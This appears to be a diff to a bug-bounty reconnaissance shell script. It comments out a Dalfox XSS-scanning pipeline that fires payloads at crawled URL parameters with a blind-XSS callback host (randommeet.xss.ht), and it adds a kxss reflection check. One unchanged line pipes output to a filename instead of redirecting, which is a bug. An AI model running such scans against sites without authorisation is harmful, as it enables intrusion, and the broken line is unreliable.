@@ -129,10 +129,14 @@ cat $2-alive.txt | gau | tee $2-gau.txt
 cat $2-waybackurls.txt $2-gau.txt $2-hakrawler.txt | sort -u | uniq -u | $2-allurls.txt #Combining Results of Gospider,Wayback,Gau
 
 
-echo -e "Starting ${GREEN}Dalfox${NORMAL} for XSS on $1... ${NORMAL}"
-gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" -a | grep -e "code-200" | awk '{print $5}' | grep -v ".js?ver=" | grep -v ".js?version=" | grep -v ".css?ver=" | grep "=" | qsreplace -a | dalfox pipe -blind randommeet.xss.ht -o $2-dalfoxXSSgospider.txt
-cat $2-allurls.txt | grep -v ".js?ver=" | grep -v ".css?ver=" | grep -v ".js?version=" | grep "=" | qsreplace -a | dalfox pipe -blind randommeet.xss.ht -o $2-dalfoxXSSgauway.txt
-sleep 2
+#echo -e "Starting ${GREEN}Dalfox${NORMAL} for XSS on $1... ${NORMAL}"
+#gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" -a | grep -e "code-200" | awk '{print $5}' | grep -v ".js?ver=" | grep -v ".js?version=" | grep -v ".css?ver=" | grep "=" | qsreplace -a | dalfox pipe -blind randommeet.xss.ht -o $2-dalfoxXSSgospider.txt
+#cat $2-allurls.txt | grep -v ".js?ver=" | grep -v ".css?ver=" | grep -v ".js?version=" | grep "=" | qsreplace -a | dalfox pipe -blind randommeet.xss.ht -o $2-dalfoxXSSgauway.txt
+#sleep 2
+
+echo -e "Starting ${GREEN}Kxss${NORMAL} for XSS on $1... ${NORMAL}"
+cat $2-allurls.txt | kxss > $2-kxss.txt
+
 
 echo -e "Starting ${GREEN}REDIRECT${NORMAL} param filtering on $1... ${NORMAL} "
 sleep 2
